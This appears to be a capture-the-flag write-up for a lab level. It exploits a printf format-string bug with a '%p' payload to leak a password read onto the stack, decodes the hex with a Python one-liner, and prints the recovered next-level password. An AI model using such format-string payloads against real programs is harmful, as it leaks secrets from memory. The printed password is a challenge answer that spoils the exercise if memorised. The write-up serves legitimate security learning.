# Level02

## Setup

We find a binary file at the root of the user **`level02`** named *`./level02`*.

```bash
scp -r -P 4242 level02@<vm_ip>:/home/users/level02/level02 .
```

### Hex-Rays

We used the Hex-Rays output on the [Dogbolt website](https://dogbolt.org/).


## Source

```C
  char s2[96];
  int v5;
  char ptr[48];
  char s[96];
  ...
  FILE *stream;
  ...
  stream = fopen("/home/users/level03/.pass", "r");
  v9 = fread(ptr, 1uLL, 0x29uLL, stream);
  fgets(s, 100, stdin);
  ...
  fgets(s2, 100, stdin);
  ...
  printf(s);
```

The `.pass` content for the level03 is stored at `ptr` with `fread`.

Then, we get an input from the user in a buffer which is placed before in the stack.
But, when we use printf with the user input in `s`, if the string is not checked before, it could contain format instructions.
And usually we use it to write some data with `%n`.

However, here the flag is in the stack so we can print the actual memory with `%p`.

And we'll translate the hex values to a string to get the flag

### Payload

```bash
	> python -c "print '%p '*32 + '\n' + 'A'*96" | ./level02
===== [ Secure Access System v1.0 ] =====
/***************************************\
| You must login to access this system. |
\**************************************/
--[ Username: --[ Password: *****************************************
0x7fffffffe4f0 (nil) 0x41 0x2a2a2a2a2a2a2a2a 0x2a2a2a2a2a2a2a2a 0x7fffffffe6e8 0x1f7ff9a08 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x4141414141414141 0x100000000 (nil) 0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d 0xfeff00 0x7025207025207025 0x2520702520702520 0x2070252070252070 0x7025207025207025 0x2520702520702520  does not have access!
```

### Solution

We look at the end of `s[]` full of 'A' (0x41), and we'll take the 40 following bytes (note that we skip 0x100..0 and nil):
	0x756e505234376848 0x45414a3561733951 0x377a7143574e6758 0x354a35686e475873 0x48336750664b394d

To transform to chars (we reverse the values due to endianness `'0x756e505234376848' = '4868373452506e75'`, or 'Hh74RPnu' for you, human)

```bash
	> python -c "print(''.join([bytes.fromhex(x).decode('ascii')[::-1] for x in '0x756e5052343768480x45414a35617339510x377a7143574e67580x354a35686e4758730x48336750664b394d'.split('0x') if x]))"
<<< Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H
```
